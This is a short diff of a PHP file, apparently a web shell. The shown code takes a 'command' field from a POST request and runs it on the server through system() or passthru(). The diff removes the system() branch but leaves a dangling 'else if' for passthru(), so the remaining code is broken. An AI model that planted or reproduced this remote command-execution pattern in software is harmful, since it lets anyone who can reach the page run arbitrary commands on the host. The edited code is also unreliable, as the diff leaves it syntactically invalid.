@@ -54,14 +54,6 @@ function archive($path){
 if (isset( $_POST['command'])):
 	$command = $_POST['command'];
 		// Check functions
-		// Try: system
-		if(function_exists('system'))
-		{
-			ob_start();
-			system($command , $return_var);
-			$output = ob_get_contents();
-			ob_end_clean();
-		}
 		// Try: passthru
 		else if(function_exists('passthru'))
 		{
